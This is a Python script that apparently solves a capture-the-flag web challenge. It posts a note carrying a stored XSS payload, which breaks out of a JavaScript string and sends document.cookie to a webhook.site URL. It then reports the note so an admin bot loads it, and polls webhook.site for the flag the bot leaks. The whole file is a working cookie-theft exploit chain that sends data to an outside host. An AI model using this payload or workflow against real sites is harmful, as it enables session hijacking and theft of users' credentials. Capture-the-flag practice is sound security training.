#!/usr/bin/env python3
import time
import requests

BASE = "http://10.0.118.48:4444"


def create_webhook_token() -> str:
    response = requests.post("https://webhook.site/token", timeout=10)
    response.raise_for_status()
    data = response.json()
    return data["uuid"]


def create_xss_note(token: str) -> str:
    payload = (
        '";new Image().src="https://webhook.site/'
        + token
        + '?c="+encodeURIComponent(document.cookie);//'
    )
    response = requests.post(
        f"{BASE}/",
        data={"content": payload},
        allow_redirects=False,
        timeout=10,
    )
    response.raise_for_status()
    location = response.headers.get("Location", "")
    if not location:
        raise RuntimeError("No note Location received")
    return location.strip("/").split("?", 1)[0]


def report_note(note_id: str) -> None:
    response = requests.post(
        f"{BASE}/report/{note_id}",
        allow_redirects=False,
        timeout=10,
    )
    response.raise_for_status()


def poll_for_flag(token: str, attempts: int = 20, delay: float = 1.5) -> str:
    url = f"https://webhook.site/token/{token}/requests?sorting=newest"
    for _ in range(attempts):
        time.sleep(delay)
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        entries = data.get("data", [])
        if not entries:
            continue

        headers = entries[0].get("headers", {})
        user_agent_values = headers.get("user-agent", [])
        if not user_agent_values:
            continue

        user_agent = user_agent_values[0]
        if "flag=" in user_agent:
            return user_agent.split("flag=", 1)[1]
        return user_agent

    raise RuntimeError("No admin callback with flag found")


def main() -> None:
    token = create_webhook_token()
    note_id = create_xss_note(token)
    report_note(note_id)
    flag = poll_for_flag(token)

    print("[+] webhook token:", token)
    print("[+] note id:", note_id)
    print("[+] flag:", flag)


if __name__ == "__main__":
    main()
